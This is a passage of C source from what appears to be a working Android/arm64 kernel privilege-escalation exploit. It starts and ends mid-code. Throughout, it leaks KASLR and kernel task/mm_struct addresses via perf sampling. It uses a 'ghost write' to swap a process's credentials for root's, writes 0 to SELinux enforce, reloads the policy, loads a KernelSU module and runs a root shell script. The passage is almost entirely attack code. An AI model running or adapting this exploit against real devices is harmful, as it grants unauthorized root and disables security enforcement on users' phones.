       * mm access. The kernel explicitly loads current->mm during fork. */
      if ((i & 0xff) == 0) {
        pid_t cpid = fork();
        if (cpid == 0) _exit(0);
        if (cpid > 0) waitpid(cpid, NULL, 0);
      }
    }
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256]; int nc = 0;
  uintptr_t mm_cands[256]; int nmm = 0;
  uintptr_t ip_cands[256]; int nip = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      uint64_t ip = *(uint64_t *)p;
      p += 8; /* skip IP */
      if (ip >= 0xffffffc000000000ULL && ip < 0xfffffffe00000000ULL && nip < 256)
        ip_cands[nip++] = ip;
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          v |= 0x0fULL << 56; /* MTE tag fixup */
          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
            cands[nc++] = v;
          if (v >= P0_PAGE_OFFSET && v < DIRECT_MAP_END &&
              (v & 0x1ff) == 0 && nmm < 256)
            mm_cands[nmm++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  uintptr_t best = 0; int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
  /* Find best mm candidate */
  if (nmm > 0) {
    uintptr_t best_mm = 0; int best_mm_cnt = 0;
    for (int i = 0; i < nmm; i++) {
      int cnt = 0;
      for (int j = 0; j < nmm; j++) if (mm_cands[j] == mm_cands[i]) cnt++;
      if (cnt > best_mm_cnt) { best_mm_cnt = cnt; best_mm = mm_cands[i]; }
    }
    pr_info("perf mm_struct: 0x%016zx (%d/%d votes)\n", best_mm, best_mm_cnt, nmm);
    last_mm_struct = best_mm;
  }
  if (nip > 0) {
    uintptr_t best_ip = 0; int best_ip_cnt = 0;
    for (int i = 0; i < nip; i++) {
      int cnt = 0;
      for (int j = 0; j < nip; j++) if (ip_cands[j] == ip_cands[i]) cnt++;
      if (cnt > best_ip_cnt) { best_ip_cnt = cnt; best_ip = ip_cands[i]; }
    }
    uintptr_t kaslr_base = best_ip & ~0xfffffULL;
    pr_info("perf IP: 0x%016zx (%d/%d votes) kaslr_base_hint~0x%016zx\n",
            best_ip, best_ip_cnt, nip, kaslr_base);
    /* Show a few unique IPs to help identify the KASLR virtual offset */
    uintptr_t shown[8]; int nshown = 0;
    for (int i = 0; i < nip && nshown < 8; i++) {
      int dup = 0;
      for (int j = 0; j < nshown; j++) if (shown[j] == ip_cands[i]) { dup = 1; break; }
      if (!dup) shown[nshown++] = ip_cands[i];
    }
    for (int i = 0; i < nshown; i++)
      pr_info("perf IP[%d]: 0x%016zx vmlinux_off=0x%zx\n", i, shown[i],
              shown[i] - (shown[i] & ~0x1fffffffULL));
  }
  return best;
}

/* KASLR virtual base detection via sched_yield perf profiling.
 *
 * sched_yield forces the thread through __schedule (vmlinux offset 0x1A01E9C,
 * ~4KB function). Perf IP samples concentrate there, forming a detectable
 * cluster. We find the densest 4KB IP window, assume it's __schedule, and
 * compute the KASLR base.
 *
 * This bypasses the KPHYS problem entirely: text_addr uses the virtual KASLR
 * slide (which we detect here) instead of the physical load address. */
#define KASLR_SCHEDULE_OFF  0x1A01E9CULL  /* __schedule vmlinux offset */
#define KASLR_SCHEDULE_SZ   0x1000ULL     /* ~4KB function body */
#define KASLR_ALIGN         0x200000ULL   /* 2MB KASLR alignment */
#define KASLR_MAX_IPS       1024

static uintptr_t detect_kaslr_base(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 2000;
  pe.sample_type = PERF_SAMPLE_IP;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("kaslr perf_event_open: errno=%d\n", errno); return 0; }

  size_t msz = 4096 * (1 + 128);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { close(fd); return 0; }

  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 200000; i++) {
    syscall(__NR_sched_yield);
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 128;
  uint64_t pos = hdr->data_tail;

  static uintptr_t ips[KASLR_MAX_IPS];
  int nips = 0;
  while (pos < head && nips < KASLR_MAX_IPS) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      uint64_t ip = *(uint64_t *)((char *)ev + sizeof(*ev));
      if (ip >= 0xffffffc000000000ULL && ip < 0xfffffffe00000000ULL)
        ips[nips++] = ip;
    }
    pos += ev->size;
  }
  hdr->data_tail = head;
  munmap(buf, msz);
  close(fd);

  pr_info("kaslr detect: collected %d kernel IPs\n", nips);
  if (nips < 5) return 0;

  /* Sort IPs ascending */
  for (int i = 0; i < nips - 1; i++)
    for (int j = i + 1; j < nips; j++)
      if (ips[i] > ips[j]) { uintptr_t t = ips[i]; ips[i] = ips[j]; ips[j] = t; }

  /* Find the densest 4KB window */
  int best_count = 0, best_idx = 0;
  for (int i = 0; i < nips; i++) {
    int count = 0;
    for (int j = i; j < nips && ips[j] - ips[i] < KASLR_SCHEDULE_SZ; j++)
      count++;
    if (count > best_count) { best_count = count; best_idx = i; }
  }
  uintptr_t cluster_lo = ips[best_idx];
  uintptr_t cluster_hi = cluster_lo;
  for (int j = best_idx; j < nips && ips[j] - cluster_lo < KASLR_SCHEDULE_SZ; j++)
    cluster_hi = ips[j];

  pr_info("kaslr detect: densest 4KB window: %d IPs at [0x%zx..0x%zx]\n",
          best_count, cluster_lo, cluster_hi);

  if (best_count < 3) {
    pr_error("kaslr detect: cluster too small (%d IPs)\n", best_count);
    return 0;
  }

  /* The cluster is in __schedule. Try 3 candidate 2MB-aligned bases. */
  uintptr_t raw = cluster_lo - KASLR_SCHEDULE_OFF;
  uintptr_t candidates[3] = {
    (raw & ~(KASLR_ALIGN - 1)),
    (raw & ~(KASLR_ALIGN - 1)) + KASLR_ALIGN,
    (raw > KASLR_ALIGN) ? (raw & ~(KASLR_ALIGN - 1)) - KASLR_ALIGN : 0
  };

  uintptr_t best_base = 0;
  int best_verify = 0;
  for (int c = 0; c < 3; c++) {
    if (!candidates[c]) continue;
    int verify = 0;
    for (int i = 0; i < nips; i++) {
      uintptr_t off = ips[i] - candidates[c];
      if (off >= KASLR_SCHEDULE_OFF && off < KASLR_SCHEDULE_OFF + KASLR_SCHEDULE_SZ)
        verify++;
    }
    pr_info("kaslr candidate[%d]: base=0x%zx verify=%d/%d\n",
            c, candidates[c], verify, nips);
    if (verify > best_verify) { best_verify = verify; best_base = candidates[c]; }
  }

  if (best_verify < 3) {
    pr_error("kaslr detect: no candidate verified (%d best)\n", best_verify);
    return 0;
  }

  /* Cross-check: look for IPs in other known functions at this base */
  static const struct { uint64_t off; uint64_t sz; const char *name; } known[] = {
    { 0x1A01E9C, 0x0C48, "__schedule" },
    { 0x0012700, 0x0080, "el0_sync" },
    { 0x007C42C, 0x0100, "__switch_to" },
    { 0x0096A24, 0x0098, "do_el0_svc" },
    { 0x1A02AE4, 0x0080, "schedule" },
  };
  int total_known = 0;
  for (int k = 0; k < (int)(sizeof(known)/sizeof(known[0])); k++) {
    int cnt = 0;
    for (int i = 0; i < nips; i++) {
      uintptr_t off = ips[i] - best_base;
      if (off >= known[k].off && off < known[k].off + known[k].sz)
        cnt++;
    }
    if (cnt > 0) {
      pr_info("kaslr cross-check: %d IPs in %s (off=0x%llx)\n",
              cnt, known[k].name, (unsigned long long)known[k].off);
      total_known += cnt;
    }
  }
  pr_info("kaslr detect: %d/%d IPs in known functions at base=0x%zx\n",
          total_known, nips, best_base);

  /* Sanity: the base must be in the kernel virtual range */
  if (best_base < 0xffffffc000000000ULL || best_base >= 0xfffffffe00000000ULL) {
    pr_error("kaslr detect: base 0x%zx out of kernel range\n", best_base);
    return 0;
  }

  pr_success("kaslr detect: base=0x%zx slide=0x%zx\n",
             best_base, best_base - KIMAGE_TEXT_BASE);
  return best_base;
}

/* Child self-profiles with perf to find its own task_struct and mm_struct.
   The child writes {task, mm} to result_fd, then loops until killed.
   Self-profiling (pid=0) is much more reliable than cross-process profiling
   because sp_el0 always holds the child's own task_struct. */
/* Result from child self-profiling: task + top-4 mm candidates */
struct self_profile_result {
  uintptr_t task;
  uintptr_t mm[4];
  int mm_cnt[4];
  int nmm;
};

static void child_self_profile(int result_fd) {
  struct self_profile_result res;
  memset(&res, 0, sizeof(res));

  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { write(result_fd, &res, sizeof(res)); return; }

  size_t msz = 4096 * (1 + 64);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { close(fd); write(result_fd, &res, sizeof(res)); return; }

  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 500000; i++) {
    syscall(__NR_getpid);
    if ((i & 0xf) == 0) {
      void *x = mmap(NULL, 4096, PROT_READ|PROT_WRITE,
                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
      if (x != MAP_FAILED) {
        *(volatile char *)x = 1;
        munmap(x, 4096);
      }
    }
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base_ptr = (char *)buf + 4096;
  size_t dsz = 4096 * 64;
  uint64_t pos = hdr->data_tail;

  uintptr_t cands[512]; int nc = 0;
  while (pos < head && nc < 510) {
    struct perf_event_header *ev = (void *)(base_ptr + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int r = 0; r < 32 && nc < 510; r++) {
          uint64_t v = regs[r];
          v |= 0x0fULL << 56; /* MTE tag fixup */
          if (v >= P0_PAGE_OFFSET && v < DIRECT_MAP_END)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head;
  munmap(buf, msz);
  close(fd);

  if (!nc) { write(result_fd, &res, sizeof(res)); return; }

  /* task_struct = most common value (sp_el0) */
  uintptr_t best_task = 0; int best_task_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_task_cnt) { best_task_cnt = cnt; best_task = cands[i]; }
  }
  res.task = best_task;

  /* Collect top-4 mm candidates: direct-map, not task, cache-line aligned */
  for (int rank = 0; rank < 4; rank++) {
    uintptr_t best = 0; int best_cnt = 0;
    for (int i = 0; i < nc; i++) {
      if (cands[i] == best_task) continue;
      if (cands[i] == P0_PAGE_OFFSET) continue;
      if ((cands[i] & 0x3f) != 0) continue;
      /* skip already-selected candidates */
      int skip = 0;
      for (int r = 0; r < rank; r++)
        if (cands[i] == res.mm[r]) { skip = 1; break; }
      if (skip) continue;
      int cnt = 0;
      for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
      if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
    }
    if (!best) break;
    res.mm[rank] = best;
    res.mm_cnt[rank] = best_cnt;
    res.nmm = rank + 1;
  }

  write(result_fd, &res, sizeof(res));
  for (;;) pause();
}

/* Fork a child that self-profiles, read back its result */
static int fork_and_profile(pid_t *out_child, struct self_profile_result *out) {
  memset(out, 0, sizeof(*out));
  *out_child = 0;
  int pipefd[2];
  if (pipe(pipefd) < 0) return -1;
  pid_t child = fork();
  if (child < 0) { close(pipefd[0]); close(pipefd[1]); return -1; }
  if (child == 0) {
    close(pipefd[0]);
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    child_self_profile(pipefd[1]);
    _exit(0);
  }
  close(pipefd[1]);
  ssize_t n = read(pipefd[0], out, sizeof(*out));
  close(pipefd[0]);
  if (n != (ssize_t)sizeof(*out) || !out->task) {
    kill(child, SIGKILL); waitpid(child, NULL, 0);
    return -1;
  }
  *out_child = child;
  return 0;
}

/* Fork a child that self-profiles to find its own mm_struct address.
   Uses dual-child cross-validation: fork two children simultaneously,
   then find the mm candidate that DIFFERS between them (per-process),
   excluding any candidate that matches (persistent system address).
   Returns the child's mm_struct address (0 on failure).
   Child stays alive in *out_child until parent kills it. */
uintptr_t perf_find_child_mm_keep(pid_t *out_child) {
  *out_child = 0;

  for (int attempt = 0; attempt < 3; attempt++) {
    /* Fork two children simultaneously for cross-validation */
    pid_t child_a = 0, child_b = 0;
    struct self_profile_result res_a, res_b;

    if (fork_and_profile(&child_a, &res_a) < 0) continue;
    if (fork_and_profile(&child_b, &res_b) < 0) {
      kill(child_a, SIGKILL); waitpid(child_a, NULL, 0);
      continue;
    }

    pr_info("perf_xval[%d]: child_a=%d task=0x%zx child_b=%d task=0x%zx\n",
            attempt, child_a, res_a.task, child_b, res_b.task);
    for (int i = 0; i < res_a.nmm; i++)
      pr_info("  A.mm[%d]=0x%zx (%d votes)\n", i, res_a.mm[i], res_a.mm_cnt[i]);
    for (int i = 0; i < res_b.nmm; i++)
      pr_info("  B.mm[%d]=0x%zx (%d votes)\n", i, res_b.mm[i], res_b.mm_cnt[i]);

    /* Find the best candidate from A that does NOT appear in B's candidates.
       A per-process mm (like the child's own) will differ between children.
       A system address (like a shared cache) will appear in both. */
    uintptr_t mm_a = 0;
    for (int i = 0; i < res_a.nmm; i++) {
      int shared = 0;
      for (int j = 0; j < res_b.nmm; j++) {
        if (res_a.mm[i] == res_b.mm[j]) { shared = 1; break; }
      }
      if (!shared && res_a.mm[i]) {
        mm_a = res_a.mm[i];
        pr_info("  A.mm[%d]=0x%zx is UNIQUE (per-process) ✓\n", i, mm_a);
        break;
      }
      if (shared)
        pr_info("  A.mm[%d]=0x%zx is SHARED (system addr, excluded)\n",
                i, res_a.mm[i]);
    }

    /* Kill child B — we only need child A's mm */
    kill(child_b, SIGKILL); waitpid(child_b, NULL, 0);

    if (mm_a) {
      int slot = (int)((mm_a & (ORDER3_SIZE - 1)) / MM_STRUCT_SZ);
      pr_info("perf_xval: validated mm=0x%zx slot=%d/%d\n",
              mm_a, slot, (int)(ORDER3_SIZE / MM_STRUCT_SZ));
      *out_child = child_a;
      return mm_a;
    }

    /* Fallback: if ALL candidates are shared between A and B, try the
       candidate that appears in A but with different rank/count than B.
       This can happen when both children coincidentally get the same
       mm from LIFO — but that's impossible since both are alive. */
    pr_info("perf_xval[%d]: all candidates shared — no per-process mm found\n",
            attempt);
    kill(child_a, SIGKILL); waitpid(child_a, NULL, 0);
  }
  pr_error("perf_xval: no validated mm found after 3 attempts\n");
  return 0;
}

uintptr_t perf_find_child_mm(void) {
  pid_t child;
  uintptr_t mm = perf_find_child_mm_keep(&child);
  if (child > 0) { kill(child, SIGKILL); waitpid(child, NULL, 0); }
  return mm;
}

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };

static void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  uintptr_t my_task = perf_find_task();
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  if (!my_task) _exit(1);
  char cmd;
  while (read(p->cmd_r, &cmd, 1) == 1) {
    crash_log_write("CHILD: got cmd=%c\n", cmd);
    if (cmd == 'C') {
      crash_log_write("CHILD: calling getuid\n");
      uint32_t uid = getuid();
      crash_log_write("CHILD: getuid=%u\n", uid);
      write(p->uid_w, &uid, sizeof(uid));
    }
    else if (cmd == 'G') break;
  }
  close(p->cmd_r); close(p->uid_w);
  if (getuid() != 0) _exit(1);
  /* Ghost write changed task->cred to init_cred but left task->real_cred
   * pointing to the original cred.  commit_creds has an unconditional
   * BUG_ON(task->cred != task->real_cred), so we CANNOT call setuid/setgid/
   * exec in this process.  Instead fork: copy_creds reads from current->cred
   * (init_cred) and sets grandchild real_cred == cred == new copy. */
  pid_t gc = fork();
  if (gc == 0) {
    setuid(0); setgid(0); setgroups(0, NULL);
    int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
    if (efd >= 0) { write(efd, "0", 1); close(efd); }
    /* W1 ghost write corrupts selinux_state bytes 1-7 (policycap flags).
     * Reloading the policy re-derives policycap from the policy binary,
     * restoring the correct values BEFORE KernelSU re-enables enforcement. */
    {
      int plf = open("/data/local/tmp/.ghostlock_polfix.log",
                     O_WRONLY|O_CREAT|O_TRUNC, 0644);
      if (plf >= 0) { dprintf(plf, "policy_reload: start uid=%d\n", getuid()); fsync(plf); }
      crash_log_write("policy_reload: start uid=%d\n", getuid());
      int pol_r = open("/sys/fs/selinux/policy", O_RDONLY);
      if (pol_r >= 0) {
        size_t cap = 4 * 1024 * 1024, len = 0;
        char *pbuf = malloc(cap);
        if (pbuf) {
          ssize_t nr;
          while ((nr = read(pol_r, pbuf + len, cap - len)) > 0) {
            len += nr;
            if (len == cap) {
              cap *= 2;
              char *nb = realloc(pbuf, cap);
              if (!nb) break;
              pbuf = nb;
            }
          }
          if (plf >= 0) { dprintf(plf, "policy read %zu bytes\n", len); fsync(plf); }
          crash_log_write("policy_reload: read %zu bytes\n", len);
          if (len > 32) {
            int pol_w = open("/sys/fs/selinux/load", O_WRONLY);
            if (pol_w >= 0) {
              ssize_t nw = write(pol_w, pbuf, len);
              int werr = errno;
              close(pol_w);
              if (plf >= 0) { dprintf(plf, "policy write ret=%zd errno=%d\n", nw, werr); fsync(plf); }
              crash_log_write("policy_reload: write ret=%zd errno=%d\n", nw, werr);
            } else {
              if (plf >= 0) { dprintf(plf, "open(load) failed errno=%d\n", errno); fsync(plf); }
              crash_log_write("policy_reload: open(load) failed errno=%d\n", errno);
            }
            int efd2 = open("/sys/fs/selinux/enforce", O_WRONLY);
            if (efd2 >= 0) { write(efd2, "0", 1); close(efd2); }
          }
          free(pbuf);
        } else {
          if (plf >= 0) { dprintf(plf, "malloc failed\n"); fsync(plf); }
          crash_log_write("policy_reload: malloc failed\n");
        }
        close(pol_r);
      } else {
        if (plf >= 0) { dprintf(plf, "open(policy) failed errno=%d\n", errno); fsync(plf); }
        crash_log_write("policy_reload: open(policy) failed errno=%d\n", errno);
      }
      if (plf >= 0) { dprintf(plf, "policy_reload: done\n"); close(plf); }
    }
    /* Load KernelSU .ko with runtime symbol fixup */
    {
      static const char *ko_paths[] = {
        "/data/local/tmp/kernelsu_sukisu.ko",
        "/data/local/tmp/kernelsu.ko",
        NULL
      };
      int loaded = 0;
      for (int k = 0; ko_paths[k] && !loaded; k++) {
        if (patch_and_load_ko(ko_paths[k], kaslr_slide) == 0) {
          loaded = 1;
        }
      }
    }
    execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
    _exit(1);
  }
  if (gc < 0) _exit(1);
  int status = 0;
  while (waitpid(gc, &status, 0) < 0) {
    if (errno == EINTR) continue;
    _exit(1);
  }
  if (WIFEXITED(status)) _exit(WEXITSTATUS(status));
  if (WIFSIGNALED(status)) _exit(128 + WTERMSIG(status));
  _exit(1);
}

static int dup_high(int fd) {
  int high = fcntl(fd, F_DUPFD, 900);
  if (high < 0) return fd;
  close(fd);
  return high;
}

static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  p->task_r = dup_high(p->task_r);
  p->cmd_w = dup_high(p->cmd_w);
  p->uid_r = dup_high(p->uid_r);
  return child;
}

static void fatal_signal_handler(int sig) {
  crash_log_write("FATAL SIGNAL %d (pid=%d tid=%d)\n",
                  sig, getpid(), (int)syscall(SYS_gettid));
  _exit(128 + sig);
}

int run_exploit(int argc, char **argv) {
  (void)argc; (void)argv;
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  crash_log_init("/data/local/tmp/exploit.log");
  {
    struct sigaction sa = {.sa_handler = fatal_signal_handler, .sa_flags = SA_RESETHAND};
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);
    sigaction(SIGFPE, &sa, NULL);
  }

  if (!active_offsets && select_offsets() < 0) return 1;

  log_startup_context();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);

  timer_reset();
  TIMER("exploit start");

  /* KASLR detection: profile with sched_yield to find __schedule,
   * compute the virtual KASLR base. This lets text_addr() return
   * correct addresses without knowing the physical load address. */
  {
    uintptr_t detected = detect_kaslr_base();
    if (detected) {
      kaslr_base = detected;
      kaslr_slide = detected - KIMAGE_TEXT_BASE;
      pr_success("KASLR: base=0x%zx slide=0x%zx\n",
                 (size_t)kaslr_base, (size_t)kaslr_slide);
    } else {
      kaslr_base = KIMAGE_TEXT_BASE;
      kaslr_slide = 0;
      if (active_offsets->kimage_text_base)
        kaslr_base = active_offsets->kimage_text_base;
      pr_warning("KASLR detection failed, using compile-time base 0x%zx\n",
                 (size_t)kaslr_base);
    }
    kaslr_done = 1;
  }

  write_root_script();

  /* Pre-W1 perf probe: try to leak mm_struct (used as fallback when KernelSnitch fails) */
  {
    uintptr_t ptask = perf_find_task();
    pr_info("pre-W1 perf task: 0x%016zx last_mm=0x%016zx\n", ptask, last_mm_struct);
  }

  /* Phase 1: Disable SELinux (+ optional fops redirect for UMH path) */
  int selinux_ok = check_selinux_off();
  if (env_flag("FORCE_W1", 0)) {
    pr_info("FORCE_W1: pretending SELinux is enforcing\n");
    selinux_ok = 0;
  }
  int umh_available = active_offsets &&
      active_offsets->off_system_unbound_wq &&
      active_offsets->off_ashmem_misc_fops;

  if (!selinux_ok && umh_available) {
    /* UMH path: mode=4 redirects miscdevice fops via W0's pi_tree.
     * miscdevice starts at ASHMEM_FOPS_PTR (repr(transparent) Registration).
     * fops at miscdevice+0x10 = ASHMEM_MISC_FOPS. */
    pr_info("UMH path: fops redirect (mode=4)...\n");
    slab_drain();
    TIMER("pre-UMH drain");
    do_one_write(data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4);
    TIMER("fops redirect done");
    selinux_ok = check_selinux_off();
  } else if (env_flag("FORCE_FOPS_ROUTE", 0) && umh_available) {
    /* VM-lab: no selinuxfs is mounted, force the mode-4 route anyway */
    pr_info("VM force: fops redirect (mode=4)...\n");
    slab_drain();
    TIMER("pre-force drain");
    do_one_write(data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4);
    TIMER("fops redirect done");
  }

  if (!selinux_ok && !root_child_done) {
    /* Fallback: direct PI write to selinux_enforcing */
    slab_drain();
    TIMER("pre-W1 drain");

    /* Pick a readable sysctl probe variable for KPHYS_SCAN / WRITE_CANARY.
     * kptr_restrict is unreadable by shell on some devices; fall back to
     * perf_event_paranoid (value -1, .data, always readable). */
#define PERF_EVENT_PARANOID_OFF 0x0279a4d0  /* sysctl_perf_event_paranoid */
    const char *probe_path = "/proc/sys/kernel/kptr_restrict";
    uint64_t probe_off = active_offsets->off_kptr_restrict;
    {
      FILE *tf = fopen(probe_path, "r");
      if (!tf) {
        pr_info("kptr_restrict unreadable, using perf_event_paranoid as probe\n");
        probe_path = "/proc/sys/kernel/perf_event_paranoid";
        probe_off = PERF_EVENT_PARANOID_OFF;
      } else {
        fclose(tf);
      }
    }

    /* KPHYS_SCAN: auto-detect kernel_phys_load by ghost-writing a readable
     * sysctl at each candidate KPHYS until the value changes. */
    if (env_flag("KPHYS_SCAN", 0) && probe_off) {
      static const uint64_t scan_kphys[] = {
        0xa8000000, 0xaa000000, 0xac000000, 0xae000000,
        0xb0000000, 0xb2000000, 0xb4000000, 0xb6000000,
        0xb8000000, 0xba000000, 0xbc000000, 0xbe000000,
        0xc0000000, 0xc2000000, 0xc4000000, 0xc6000000,
        0xc8000000, 0xca000000, 0xcc000000, 0xce000000,
        0xd0000000, 0xd2000000, 0xd4000000, 0xd6000000,
        0xd8000000, 0xda000000, 0xdc000000, 0xde000000,
        0xe0000000, 0xe2000000, 0xe4000000, 0xe6000000,
        0xe8000000, 0xea000000, 0xec000000, 0xee000000,
        0xf0000000, 0xf2000000, 0xf4000000, 0xf6000000,
        0xf8000000, 0xfa000000, 0xfc000000, 0xfe000000,
        0xa0000000, 0xa2000000, 0xa4000000, 0xa6000000,
        0x98000000, 0x9a000000, 0x9e000000,
        0
      };
      pr_info("KPHYS_SCAN: probe=%s off=0x%llx, scanning %zu candidates\n",
              probe_path, (unsigned long long)probe_off,
              sizeof(scan_kphys)/sizeof(scan_kphys[0]) - 1);
      int found = 0;
      for (int si = 0; scan_kphys[si] != 0 && !found; si++) {
        p0_kernel_phys_load = scan_kphys[si];
        uintptr_t probe_target = data_addr(KIMAGE_TEXT_BASE + probe_off);
        char pre[32] = {0};
        FILE *pf = fopen(probe_path, "r");
        if (pf) { fgets(pre, sizeof(pre), pf); fclose(pf); }
        pre[strcspn(pre, "\r\n")] = '\0';
        pr_info("KPHYS_SCAN [%d]: KPHYS=0x%llx target_va=0x%zx (pre=%s)\n",
                si, (unsigned long long)scan_kphys[si], probe_target, pre);
        if (pre[0] == '0') {
          pr_success("KPHYS_SCAN: probe already 0 — prior write hit! KPHYS=0x%llx\n",
                     (unsigned long long)scan_kphys[si]);
          found = 1; break;
        }
        do_one_write(probe_target, "SCAN: probe", 1);
        usleep(100000);
        char post[32] = {0};
        pf = fopen(probe_path, "r");
        if (pf) { fgets(post, sizeof(post), pf); fclose(pf); }
        post[strcspn(post, "\r\n")] = '\0';
        pr_info("KPHYS_SCAN [%d]: post=%s\n", si, post);
        if (strcmp(pre, post) != 0) {
          pr_success("KPHYS_SCAN: FOUND! KPHYS=0x%llx (probe changed %s->%s)\n",
                     (unsigned long long)scan_kphys[si], pre, post);
          found = 1;
        }
        if (check_selinux_off()) {
          pr_success("KPHYS_SCAN: SELinux disabled by prior scan write!\n");
          selinux_ok = 1; found = 1;
        }
      }
      if (found && !selinux_ok) {
        pr_info("KPHYS_SCAN: using KPHYS=0x%llx for SELinux write\n",
                (unsigned long long)p0_kernel_phys_load);
      } else if (!found) {
        pr_error("KPHYS_SCAN: exhausted all candidates\n");
        return 1;
      }
      TIMER("KPHYS scan complete");
    }

    /* Canary: test ghost write on a readable sysctl (writable .data).
     * Uses text_addr when KASLR slide is known (virtual KIMAGE address),
     * falls back to data_addr (direct-map alias, needs correct KPHYS). */
    if (env_flag("WRITE_CANARY", 0) && probe_off && !selinux_ok) {
      uintptr_t canary_target = kaslr_slide
          ? text_addr(KIMAGE_TEXT_BASE + probe_off)
          : data_addr(KIMAGE_TEXT_BASE + probe_off);
      uintptr_t selinux_va = kaslr_slide
          ? text_addr(SELINUX_ENFORCING)
          : data_addr(SELINUX_ENFORCING);
      char pre[32] = {0};
      FILE *pf = fopen(probe_path, "r");
      if (pf) { fgets(pre, sizeof(pre), pf); fclose(pf); }
      pre[strcspn(pre, "\r\n")] = '\0';
      pr_info("WRITE_CANARY: probe=%s pre=%s target=0x%zx (selinux=0x%zx) mode=%s\n",
              probe_path, pre, canary_target, selinux_va,
              kaslr_slide ? "text_addr(KASLR)" : "data_addr(KPHYS)");
      do_one_write(canary_target, "CANARY: probe", 1);
      usleep(200000);
      char post[32] = {0};
      pf = fopen(probe_path, "r");
      if (pf) { fgets(post, sizeof(post), pf); fclose(pf); }
      post[strcspn(post, "\r\n")] = '\0';
      pr_info("WRITE_CANARY: post=%s (was %s)\n", post, pre);
      if (strcmp(pre, post) != 0) {
        pr_success("WRITE_CANARY: ghost write CONFIRMED (probe changed)\n");
      } else {
        pr_error("WRITE_CANARY: ghost write FAILED (probe unchanged)\n");
      }
    }
